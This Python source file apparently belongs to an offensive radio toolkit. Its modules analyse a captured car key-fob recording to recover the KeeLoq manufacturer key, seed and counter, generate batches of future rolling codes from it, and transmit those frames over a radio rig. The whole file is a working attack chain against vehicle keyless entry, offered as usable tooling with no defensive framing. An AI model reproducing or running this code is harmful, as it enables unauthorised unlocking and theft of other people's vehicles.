"""Fob capture, hop analysis, counter sweep and replay."""

from __future__ import annotations

import os
import time

from omni.car import analysis, vehicles
from omni.core import config, console
from omni.core.module import Option
from omni.rf.subfile import SubFile
from omni.car.modules._base import CarModule

__all__ = ["Analyze", "Sweep", "Replay"]


class Analyze(CarModule):
    NAME = "car.analyze"
    DESCRIPTION = "Analyze a captured fob .sub: split frame, hunt the key"
    OPTIONS = (Option("SUB", "captured .sub file", "", required=True),
               Option("BRAND", "brand hint (narrows the profile match)"),
               Option("KEYSTORE", "manufacturer keystore path"))

    def execute(self) -> dict:
        sub = self.load_sub()
        brands = []
        if self.get("BRAND"):
            brands = [self.get("BRAND")]
        else:
            brands = sorted({p.brand for p in
                             vehicles.for_frequency(int(sub.frequency))})
        store = self.keystore(self.get("KEYSTORE") or None)
        out = analysis.analyze_sub(sub, store, brands)
        console.kv([("frequency", f"{sub.frequency / 1e6:.3f} MHz"),
                    ("protocol", sub.protocol),
                    ("verdict", out.get("verdict", ""))])
        if out.get("manufacturer"):
            console.ok(f"manufacturer key: {out['manufacturer']} "
                       f"(counter 0x{out['counter']:04X} seed 0x{out['seed']:08X})")
            sub.manufacture = out["manufacturer"]
            sub.seed = out["seed"]
            sub.counter_mode = 2
            path = os.path.join(config.output_dir("car"),
                                os.path.basename(self.get("SUB")))
            sub.save(path)
            console.info(f"annotated copy: {path}")
        elif out.get("button") is not None:
            console.info(f"button 0x{out['button']:X} serial {out['serial']}")
        return out


class Sweep(CarModule):
    NAME = "car.sweep"
    DESCRIPTION = "Pre-compute future rolling codes for a captured fob"
    OPTIONS = (Option("SUB", "captured KeeLoq .sub file", "", required=True),
               Option("COUNT", "frames to generate"),
               Option("STEP", "skip every Nth counter", "1"),
               Option("START", "explicit start counter (hex or dec)"),
               Option("KEYSTORE", "manufacturer keystore path"),
               Option("OUT", "output directory"))

    def execute(self) -> dict:
        sub = self.load_sub()
        store = self.keystore(self.get("KEYSTORE") or None)
        start = self.get("START")
        start_cnt = int(start, 0) if start else None
        count = self.get_int("COUNT", 0) or int(
            config.get_value("car.sweep_window", 4096))
        subs, counters = analysis.sweep(sub, store, start=start_cnt,
                                        count=count, step=self.get_int("STEP", 1))
        if not counters:
            console.warn("no counters generated — is the manufacturer key known?")
            return {"files": [], "counters": []}
        outdir = self.get("OUT") or config.output_dir("car/sweep")
        paths = analysis.write_subs(subs, os.path.expanduser(outdir),
                                    prefix=os.path.splitext(
                                        os.path.basename(self.get("SUB")))[0])
        console.ok(f"{len(paths)} frame(s) {counters[0]:04X}..{counters[-1]:04X} "
                   f"-> {outdir}")
        console.info("play them in order: omni run car.replay SUB=<file>")
        return {"files": paths, "counters": counters}


class Replay(CarModule):
    NAME = "car.replay"
    DESCRIPTION = "Transmit a .sub (or a whole sweep directory) over the radio"
    OPTIONS = (Option("SUB", ".sub file or directory", "", required=True),
               Option("REPEAT", "transmissions per frame"),
               Option("GAP", "gap between frames (s)", "0"),
               Option("LIMIT", "max frames from a directory", "50"))

    def execute(self) -> dict:
        target = os.path.expanduser(self.get("SUB"))
        subs = []
        if os.path.isdir(target):
            names = sorted(n for n in os.listdir(target) if n.endswith(".sub"))
            subs = [SubFile.load(os.path.join(target, n))
                    for n in names[:max(1, self.get_int("LIMIT", 50))]]
        else:
            subs = [self.load_sub()]
        repeat = self.get_int("REPEAT",
                              int(config.get_value("car.replay_repeat", 3)))
        gap = float(self.get("GAP") or 0)
        rig = self.rig()
        try:
            tx = rig.tx()
            sent = 0
            for sub in subs:
                for _ in range(max(1, repeat)):
                    sent += tx.send_subfile(sub)
                    if gap:
                        time.sleep(gap)
            console.ok(f"{sent} transmission(s) from {len(subs)} frame(s)")
            return {"frames": len(subs), "sent": sent, "demo": rig.demo}
        finally:
            rig.close()
